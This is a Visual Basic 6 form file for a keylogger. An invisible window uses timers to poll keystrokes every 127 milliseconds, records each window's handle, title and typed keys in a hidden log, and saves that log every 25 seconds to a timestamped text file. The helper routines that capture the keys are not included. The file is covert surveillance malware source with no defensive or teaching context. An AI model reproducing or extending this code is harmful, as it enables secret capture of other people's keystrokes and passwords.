VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Form1"
   ClientHeight    =   7815
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   10680
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7815
   ScaleWidth      =   10680
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer tmrSave 
      Interval        =   25000
      Left            =   1440
      Top             =   120
   End
   Begin VB.Timer tmrPrint 
      Interval        =   10000
      Left            =   840
      Top             =   120
   End
   Begin VB.Timer tmrPoll 
      Interval        =   127
      Left            =   240
      Top             =   120
   End
   Begin VB.Frame fraActivityLog 
      Caption         =   "Activity Log"
      Height          =   6135
      Left            =   120
      TabIndex        =   0
      Top             =   1200
      Width           =   10455
      Begin VB.TextBox txtActivityLog 
         Height          =   5415
         Left            =   0
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   1
         Top             =   0
         Width           =   10215
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim startdate As Date
Private Sub Form_Load()
startdate = Now
spChars(0) = ")": spChars(1) = "!": spChars(2) = "@": spChars(3) = "#": spChars(4) = "$"
spChars(5) = "%": spChars(6) = "^": spChars(7) = "&": spChars(8) = "*": spChars(9) = "("
End Sub


Private Sub tmrPoll_Timer()
Call PollForKeyboardInputs
End Sub

Private Sub tmrPrint_Timer()
On Error Resume Next
Dim i As Integer, handle As Long, title As String, keys As String, logDate As String, lmt As String
Dim WindowHandle As String, WindowTitle As String, WindowKeys As String, WindowLMT As String
logDate = "Last Logged At " & Now
txtActivityLog.Text = logDate & vbCrLf & String(Len(logDate), "=") & vbCrLf
For i = 0 To UBound(wndHndl)
    handle = GetLoggedHandle(i)
    title = GetLoggedTitle(i)
    keys = GetLoggedKeys(i)
    lmt = GetLMT(i)
    WindowHandle = "Window Handle: " & CStr(handle)
    WindowTitle = "Window Title: " & title
    WindowLMT = "Last Modified: " & lmt
    WindowKeys = "Logged Keys : " & keys
    Call AddToLog(String(Len(WindowTitle), "="))
    Call AddToLog(WindowHandle)
    Call AddToLog(WindowTitle)
    Call AddToLog(WindowLMT)
    Call AddToLog(WindowKeys)
    Call AddToLog(String(Len(WindowTitle), "=") & vbCrLf)
Next
End Sub

Private Sub tmrSave_Timer()
Call SaveLog
End Sub

Private Sub SaveLog()
Dim path2Save As String, fileHndl As Integer, dt As Date
dt = Date
path2Save = App.Path & "\Dump_ At_" & Day(startdate) & "." & Month(startdate) _
& "." & Year(startdate) & ".." & Hour(startdate) & "." & Minute(startdate) _
& "." & Second(startdate) & ".txt"
fileHndl = FreeFile
Open path2Save For Output As #fileHndl
Write #fileHndl, txtActivityLog.Text
Close #fileHndl
End Sub
